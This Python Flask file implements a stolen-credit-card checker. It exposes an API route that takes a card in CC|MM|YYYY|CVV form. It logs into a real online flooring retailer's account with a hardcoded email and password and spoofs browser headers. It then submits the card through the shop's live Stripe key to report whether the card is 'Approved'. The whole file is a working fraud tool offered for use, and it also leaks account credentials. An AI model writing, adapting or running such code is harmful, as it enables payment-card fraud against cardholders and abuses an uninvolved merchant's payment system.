from flask import Flask, request, jsonify
import requests
import random
import re

app = Flask(__name__)

def check_card(ccx):
    try:
        ccx = ccx.strip()
        parts = ccx.split("|")
        if len(parts) != 4:
            return {"status": "Declined", "response": "Invalid card format. Use CC|MM|YYYY|CVV"}

        n, mm, yy, cvc = parts

        # Create a session
        session = requests.Session()

        # Random user-agent
        user_agents = [
            "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15"
        ]
        random_user_agent = random.choice(user_agents)

        # Headers for initial GET request
        headers = {
            'authority': 'thefloordepot.com.au',
            'accept': '/',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://thefloordepot.com.au',
            'referer': 'https://thefloordepot.com.au/my-account/',
            'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; RMX2030) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        response = session.get('https://thefloordepot.com.au/my-account/', headers=headers)

        match = re.search(r'name="woocommerce-login-nonce"\s+value="([^"]+)"', response.text)

        if not match:
            return {"status": "Declined", "response": "Nonce not found"}

        nonce_value = match.group(1)

        headers = {
            'authority': 'thefloordepot.com.au',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://thefloordepot.com.au',
            'referer': 'https://thefloordepot.com.au/my-account/',
            'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; RMX2030) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
        }

        data = {
            'username': 'frabsok@gmail.com',
            'password': 'Sh@7380046305',
            'rememberme': 'forever',
            'woocommerce-login-nonce': nonce_value,
            '_wp_http_referer': '/my-account/',
            'login': 'Log in',
        }

        response = session.post('https://thefloordepot.com.au/my-account/', headers=headers, data=data)

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Pragma': 'no-cache',
            'Referer': 'https://thefloordepot.com.au/my-account/payment-methods/',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': random_user_agent,
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
        }

        response = session.get('https://thefloordepot.com.au/my-account/add-payment-method/', headers=headers)

        match = re.search(r'"add_card_nonce":"([a-zA-Z0-9]+)"', response.text)
        if not match:
            return {"status": "Declined", "response": "add_card_nonce not found"}

        add_card_nonce = match.group(1)

        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'pragma': 'no-cache',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': random_user_agent,
        }

        data = f'referrer=https%3A%2F%2Fthefloordepot.com.au&type=card&owner[name]=+&owner[email]=frabsok%40gmail.com&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=515db512-aff8-4de3-9be4-388833d105de9e21b4&muid=51e66923-e4ec-4ca5-97e0-40dc51d22ddadeecfb&sid=fa75b836-10ef-4681-b691-162f0e12e2a3b5e9f4&payment_user_agent=stripe.js%2Fb7c6e82e52%3B+stripe-js-v3%2Fb7c6e82e52%3B+split-card-element&time_on_page=62926&key=pk_live_51Hu8AnJt97umck43lG2FZIoccDHjdEFJ6EAa2V5KAZRsJXbZA7CznDILpkCL2BB753qW7yGzeFKaN77HBUkHmOKD00X2rm0Tkq'

        response = session.post('https://api.stripe.com/v1/sources', headers=headers, data=data)
        stripe_response = response.json()

        if 'error' in stripe_response:
            error_code = stripe_response['error']['code']
            error_message = stripe_response['error']['message']
            return {"status": "Declined", "response": error_message}

        id = stripe_response.get('id', '')
        if not id:
            return {"status": "Declined", "response": "Payment source creation failed"}

        headers = {
            'Accept': 'application/json, text/javascript, /; q=0.01',
            'Accept-Language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin': 'https://thefloordepot.com.au',
            'Pragma': 'no-cache',
            'Referer': 'https://thefloordepot.com.au/my-account/add-payment-method/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': random_user_agent,
            'X-Requested-With': 'XMLHttpRequest',
            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
        }

        params = {
            'wc-ajax': 'wc_stripe_create_setup_intent',
        }

        data = {
            'stripe_source_id': id,
            'nonce': add_card_nonce,
        }

        response = session.post('https://thefloordepot.com.au/', params=params, headers=headers, data=data)
        final_response = response.json()

        if "status" in final_response:
            if final_response["status"] == "success":
                return {"status": "Approved", "response": "Card successfully verified"}
            elif final_response["status"] == "error":
                error_msg = final_response.get("error", {}).get("message", "Card was declined")
                return {"status": "Declined", "response": error_msg}
        
        return {"status": "Declined", "response": str(final_response)}

    except Exception as e:
        return {"status": "Error", "response": f"An exception occurred: {str(e)}"}

@app.route('/gate=stripeauth/key=<key>/cc=<cc>')
def process_card(key, cc):
    if key != "darkdark":
        return jsonify({"status": "Error", "response": "Invalid key"})

    result = check_card(cc)
    return jsonify(result)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=9090)
